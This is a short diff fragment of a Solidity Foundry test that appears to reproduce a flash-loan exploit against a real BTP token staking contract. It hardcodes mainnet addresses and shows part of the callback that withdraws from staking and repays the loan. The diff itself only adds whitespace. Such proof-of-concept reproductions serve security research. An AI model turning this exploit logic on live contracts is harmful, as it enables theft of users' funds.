@@ -19,11 +19,14 @@ import "./../interface.sol";
 // Hacking God : https://www.google.com/
 
 interface IStaking {
+
     function Lock_Token(uint256 plan, uint256 _amount) external;
     function withdraw(uint256 _plan) external;
+
 }
 
 contract ContractTest is Test {
+
     IERC20 BTP = IERC20(0x40F75eD09c7Bc89Bf596cE0fF6FB2ff8D02aC019);
     IStaking Staking = IStaking(0x9D6d817ea5d4A69fF4C4509bea8F9b2534Cec108);
     Uni_Pair_V2 Pair = Uni_Pair_V2(0x858DE6F832c9b92E2EA5C18582551ccd6add0295);
@@ -54,4 +57,5 @@ contract ContractTest is Test {
         Staking.withdraw(1);
         BTP.transfer(msg.sender, flashAmount * 10_000 / 9975 + 1000);
     }
+
 }
